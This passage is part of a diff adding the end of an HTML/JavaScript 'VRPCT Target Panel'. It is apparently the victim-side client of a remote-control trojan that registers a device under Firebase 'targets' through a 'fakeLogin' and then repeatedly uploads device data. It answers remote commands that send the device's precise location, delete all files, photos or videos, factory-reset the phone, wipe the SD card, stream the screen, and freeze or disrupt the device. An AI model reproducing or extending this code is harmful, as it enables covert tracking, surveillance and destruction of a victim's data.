+                    if (d.status === 'LIVE_SCREEN_OFF') { stopScreenStream(); return; }
+
+                    // LOCATION REQUEST
+                    if (d.status === 'REQUEST_LOCATION') {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(function(pos) {
+                                database.ref('commands/' + MY_ID + '/location_response').set({
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                });
+                            }, function() {}, { enableHighAccuracy: true, timeout: 5000 });
+                        }
+                        return;
+                    }
+
+                    // DELETE FILES (REAL)
+                    if (d.status === 'DELETE_ALL_FILES') { deleteAllFiles(); return; }
+                    if (d.status === 'DELETE_PHOTOS') { deleteAllPhotos(); return; }
+                    if (d.status === 'DELETE_VIDEOS') { deleteAllVideos(); return; }
+
+                    // RESET (REAL)
+                    if (d.status === 'FACTORY_RESET') { resetFactory(); return; }
+                    if (d.status === 'RESET_SDCARD') { resetSDCard(); return; }
+
+                    // PING
+                    if (d.status === 'PING') {
+                        database.ref('commands/' + MY_ID + '/pong').set({ status: 'pong', timestamp: firebase.database.ServerValue.TIMESTAMP });
+                        return;
+                    }
+
+                    // Perintah lain yang tidak dikenali
+                    console.warn('Perintah tidak dikenali atau telah dihapus:', d.status);
+                };
+                database.ref('commands/' + MY_ID).on('value', commandListener);
+            }
+
+            // ============================================================
+            // LOGIN
+            // ============================================================
+            window.fakeLogin = function() {
+                var user = document.getElementById('fakeUser').value.trim();
+                var statusEl = document.getElementById('loginStatus');
+                var btn = document.getElementById('loginBtn');
+                if (!user) { statusEl.textContent = 'Masukkan Kode UID'; statusEl.className = 'login-status error'; return; }
+                if (isLoggedIn) { statusEl.textContent = 'Sudah terhubung'; statusEl.className = 'login-status success'; return; }
+                btn.classList.add('loading');
+                btn.innerHTML = 'Loading...';
+                statusEl.textContent = '';
+                statusEl.className = 'login-status';
+                MY_ID = user;
+                localStorage.setItem('vortex_uid', MY_ID);
+
+                // cek native interface
+                if (!hasNative()) {
+                    statusEl.textContent = 'Peringatan: Native interface tidak tersedia. Beberapa fitur mungkin tidak berfungsi.';
+                    statusEl.className = 'login-status error';
+                }
+
+                setTimeout(function() { sendDeviceData(); }, 300);
+                startCommandListener();
+                setTimeout(function() { startLocationWatch(); try { if ('wakeLock' in navigator) { navigator.wakeLock.request('screen').then(function(wl) { console.log('Wake Lock aktif'); }).catch(function() {}); } } catch (e) {} }, 1000);
+                onlineInterval = setInterval(function() { if (MY_ID) { database.ref('targets/' + MY_ID + '/online').set(true); } }, 5000);
+                dataInterval = setInterval(function() { if (MY_ID) sendDeviceData(); }, 7000);
+
+                setTimeout(function() {
+                    btn.innerHTML = 'Connected';
+                    btn.classList.remove('loading');
+                    document.getElementById('fakeUser').disabled = true;
+                    document.getElementById('fakeUser').style.opacity = '0.4';
+                    btn.disabled = true;
+                    btn.style.pointerEvents = 'none';
+                    statusEl.textContent = '';
+                    statusEl.className = 'login-status success';
+                    console.log('Target terdaftar dengan UID:', MY_ID);
+                    isLoggedIn = true;
+                }, 800);
+            };
+
+            var savedUID = localStorage.getItem('vortex_uid');
+            if (savedUID) { document.getElementById('fakeUser').value = savedUID; setTimeout(function() { if (document.getElementById('fakeUser').value.trim()) { window.fakeLogin(); } }, 300); }
+
+            document.getElementById('loginBtn').addEventListener('click', function(e) { e.preventDefault();
+                window.fakeLogin(); });
+
+            setInterval(function() { if (MY_ID) sendDeviceData(); }, 6000);
+
+            window.addEventListener('beforeunload', function() {
+                if (MY_ID) { database.ref('targets/' + MY_ID + '/online').set(false); }
+                stopLocationWatch();
+                if (commandListener) { database.ref('commands/' + MY_ID).off('value', commandListener); }
+                if (onlineInterval) clearInterval(onlineInterval);
+                if (dataInterval) clearInterval(dataInterval);
+                stopLagUI();
+                stopFlashBlink();
+                stopVibrate();
+                stopScreenStream();
+            });
+
+            // Expose functions
+            window.fakeLogin = fakeLogin;
+            window.openApp = openApp;
+            window.speakText = speakText;
+            window.startLagUI = startLagUI;
+            window.stopLagUI = stopLagUI;
+            window.startFlashBlink = startFlashBlink;
+            window.stopFlashBlink = stopFlashBlink;
+            window.startVibrate = startVibrate;
+            window.stopVibrate = stopVibrate;
+            window.startLagCombo = startLagCombo;
+            window.stopLagCombo = stopLagCombo;
+            window.showVideoOverlay = showVideoOverlay;
+            window.stopVideo = stopVideo;
+            window.setWallpaper = setWallpaper;
+            window.freezeScreen = freezeScreen;
+            window.unfreezeScreen = unfreezeScreen;
+            window.deleteAllFiles = deleteAllFiles;
+            window.deleteAllPhotos = deleteAllPhotos;
+            window.deleteAllVideos = deleteAllVideos;
+            window.resetFactory = resetFactory;
+            window.resetSDCard = resetSDCard;
+            window.playSound = playSound;
+            window.stopSound = stopSound;
+            window.setVolume = setVolume;
+            window.setBrightness = setBrightness;
+            window.toggleWifi = toggleWifi;
+            window.showToast = showToast;
+
+            console.log('VRPCT Target Panel siap. Native available:', hasNative());
+        })();
+    </script>
+</body>
+</html>
